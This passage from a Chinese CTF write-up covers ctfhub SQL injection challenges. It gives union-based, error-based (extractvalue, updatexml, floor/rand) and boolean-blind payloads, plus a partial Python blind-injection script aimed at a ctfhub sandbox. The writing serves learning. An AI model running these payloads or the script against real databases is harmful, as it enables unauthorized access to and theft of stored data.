class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(), <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>你会发现你得不到你想要的数据，页面只会显示主select查询到第一行的数据。</p><p><img src="https://upyun.wuuconix.link/image-20210824124312418.png" alt="or" /></p><p>所以我们需要让主select查询不到任何东西，而只显示我们select查询到的东西。</p><p>很显然这样就行了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(), <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210824124420064.png" alt="得到数据库名" /></p><p>之后就是基本操作。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name), <span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210824124503242.png" alt="得到所有表名" /></p><p>锁定flag表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(column_name), <span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210824124549522.png" alt="得到列名" /></p><p>锁定flag表中的flag列。</p><p>进行查询。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> flag, <span class="hljs-number">2</span> <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210824124721876.png" alt="flag" /></p><p>不得不说，上学期学习了数据库之后对SQL的理解加深了许多，这道题很快做出来。</p><p>ctfhub的sql注入也非常友善，把完整的sql语句给出来了，非常适合新手来进行学习。</p><h3 id="字符型注入"><a class="markdownIt-Anchor" href="#字符型注入"></a> 字符型注入</h3><p>和上一篇整形注入几乎一致，但是这里有了引号，首先利用引号闭合，之后还需要利用注释符<code>#</code>还使原来的右引号失效。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=2 union select database(), 2#</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825121539761.png" alt="爆库" /></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=2 union select 2, group_concat(table_name) from information_schema.tables where table_schema = &#x27;</span>sqli<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825121623587.png" alt="爆表" /></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=2 union select 2, group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>flag<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825121650658.png" alt="爆字段" /></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=2 union select 2, flag from flag#</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825121747063.png" alt="查询flag" /></p><h3 id="报错注入"><a class="markdownIt-Anchor" href="#报错注入"></a> 报错注入</h3><p>利用extracvalue来xpath报错。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> database()))))<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825141126993.png" alt="extracvalue爆库" /></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;sqli&#x27;</span>))))<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825141214074.png" alt="extractvalue爆表" /></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;flag&#x27;</span>))))<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825141241439.png" alt="extract爆字段" /></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag))))<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825141305150.png" alt="extract得到flag" /></p><p>利用updatexml来xpath报错。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>, (concat (<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> database()))),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825141342744.png" alt="updatexml爆库" /></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>, (concat (<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span>))),<span class="hljs-number">1</span>)) <br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825141414090.png" alt="updatexml爆表" /></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>, (concat (<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span>))),<span class="hljs-number">1</span>)) <br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825141448334.png" alt="updatexml爆字段" /></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag)), <span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825141514457.png" alt="updatexml得到flag" /></p><p>利用floor来group by主键重复报错。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), concat((<span class="hljs-keyword">select</span> database()), <span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) x <span class="hljs-keyword">from</span> news <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825141604672.png" alt="group by爆库" /></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>), <span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) x <span class="hljs-keyword">from</span> news <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br></code></pre></td></tr></table></figure><p>注：图中有错误，在limit那里，正确的用法如上。</p><p><img src="https://upyun.wuuconix.link/image-20210825141630905.png" alt="group by爆表" /></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>), <span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) x <span class="hljs-keyword">from</span> news <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825141657226.png" alt="group by 爆字段" /></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), concat((<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>), <span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) x <span class="hljs-keyword">from</span> news <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210825141718197.png" alt="group by得到flag" /></p><p>在30分钟里用三种方法报错注入得到flag，顺便写出writeup，感觉蛮快了2333。</p><p>extractvalue和updatexml用起来没什么问题，<s>很顺利。</s></p><p>突然发现用这两个函数得到的flag是不完整的。这两个函数的返回值最多只有32个字符。这里和最终的flag少了一个右大括号。</p><p>以后遇到这种问题再用一下<code>right()</code>获取右边的值即可。</p><p><img src="https://upyun.wuuconix.link/image-20210825150248266.png" alt="right函数" /></p><p>用group by的时候问题很大，首先它貌似只试用于mysql 5.x的版本，以至于我在本地最新mysql版本上复现出来。关于这个问题在 csdn上 写了一篇<a href="https://blog.csdn.net/Cypher_X/article/details/119909526">博客</a>。</p><p>然后我发现用这个group by来报错的时候不能用爆表和爆字段的时候不能用<code>group_concat</code>。但是我在本地测试的时候又可以，很奇怪，感觉是题目的锅。</p><p><img src="https://upyun.wuuconix.link/image-20210825151004811.png" alt="本地成功用group_concat" /></p><p>但是没关系，不用group_concat就手动一个个查，利用limit来控制。</p><p><img src="https://upyun.wuuconix.link/image-20210825151444215.png" alt="limit的用法" /></p><p>limit的第一个值表示从 第几行开始，第二个值表示从开始的行取几行。</p><h3 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注"></a> 布尔盲注</h3><p>布尔盲注使用场景的特征十分明显，即界面不会给出查询的具体结果，也不会给你报错信息。而只会告诉你查询成功还是查询失败。</p><p>这就需要我们去利用一些神奇的函数比如<code>substr</code>,<code>ascii</code>,<code>length</code>来猜测。</p><p>猜测什么呢？首先猜测数据库的长度，知道了长度，就去猜数据库每个字符。知道了数据库，就去猜数据表的个数，表名长度，具体表名等等等等。也就是所有的一切都是你需要用上面的函数来猜出来的。</p><p>如果手工来实现这一过程，就会变得非常繁琐，这里我花了一个下午的时间写了一个盲注的脚本。</p><p>运行过程十分舒适和人性化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>success_flag = <span class="hljs-string">&quot;query_success&quot;</span> <span class="hljs-comment">#成功查询到内容的关键字</span><br>base_url = <span class="hljs-string">&quot;http://challenge-d41158772186d1b6.sandbox.ctfhub.com:10800/?id=&quot;</span><br>headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database_length</span>():<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and length(database()) = &quot;</span> + <span class="hljs-built_in">str</span>(length)<br>        url = base_url + quote(<span class="hljs-built_in">id</span>) <span class="hljs-comment">#很重要，因为id中有许多特殊字符，比如#，需要进行url编码</span><br>        response = requests.get(url, headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;database length&quot;</span>, length, <span class="hljs-string">&quot;failed!&quot;</span>)<br>            length+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;database length&quot;</span>, length, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名的长度为&quot;</span>, length)<br>    <span class="hljs-keyword">return</span> length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database</span>(<span class="hljs-params">database_length</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    database = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, database_length + <span class="hljs-number">1</span>):<br>        l, r = <span class="hljs-number">0</span>, <span class="hljs-number">127</span> <span class="hljs-comment">#神奇的申明方法</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">ascii</span> = (l + r) // <span class="hljs-number">2</span><br>            id_equal = <span class="hljs-string">&quot;1 and ascii(substr(database(), &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) = &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>            response = requests.get(base_url + quote(id_equal), headers=headers).text<br>            <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                database += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;目前已知数据库名&quot;</span>, database)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                id_bigger = <span class="hljs-string">&quot;1 and ascii(substr(database(), &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) &gt; &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>                response = requests.get(base_url + quote(id_bigger), headers=headers).text<br>                <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                    l = <span class="hljs-built_in">ascii</span> + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    r = <span class="hljs-built_in">ascii</span> - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名为&quot;</span>, database)<br>    <span class="hljs-keyword">return</span> database<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_table_num</span>(<span class="hljs-params">database</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    num = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select count(table_name) from information_schema.tables where table_schema = &#x27;&quot;</span> + database + <span class="hljs-string">&quot;&#x27;) = &quot;</span> + <span class="hljs-built_in">str</span>(num)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库中有&quot;</span>, num, <span class="hljs-string">&quot;个表&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> num<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_table_length</span>(<span class="hljs-params">index, database</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select length(table_name) from information_schema.tables where table_schema = &#x27;&quot;</span> + database + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;, 1) = &quot;</span> + <span class="hljs-built_in">str</span>(length)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table length&quot;</span>, length, <span class="hljs-string">&quot;failed!&quot;</span>)<br>            length+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table length&quot;</span>, length, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表名的长度为&quot;</span>, length)<br>    <span class="hljs-keyword">return</span> length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_table</span>(<span class="hljs-params">index, table_length, database</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    table = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, table_length + <span class="hljs-number">1</span>):<br>        l, r = <span class="hljs-number">0</span>, <span class="hljs-number">127</span> <span class="hljs-comment">#神奇的申明方法</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">ascii</span> = (l + r) // <span class="hljs-number">2</span><br>            id_equal = <span class="hljs-string">&quot;1 and (select ascii(substr(table_name, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from information_schema.tables where table_schema = &#x27;&quot;</span> + database + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) = &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>            response = requests.get(base_url + quote(id_equal), headers=headers).text<br>            <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                table += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;目前已知数据库名&quot;</span>, table)<br>                <span 